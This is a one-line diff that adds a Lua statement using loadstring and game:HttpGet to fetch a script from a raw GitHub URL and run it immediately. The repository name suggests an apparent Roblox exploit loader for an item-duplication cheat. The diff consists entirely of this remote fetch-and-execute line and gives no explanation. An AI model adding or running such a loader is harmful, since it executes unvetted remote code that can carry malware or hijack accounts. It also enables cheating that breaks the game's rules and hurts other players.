@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpDupe/mamamoaaa-c80cb/main/mamamoaaa.lua"))()
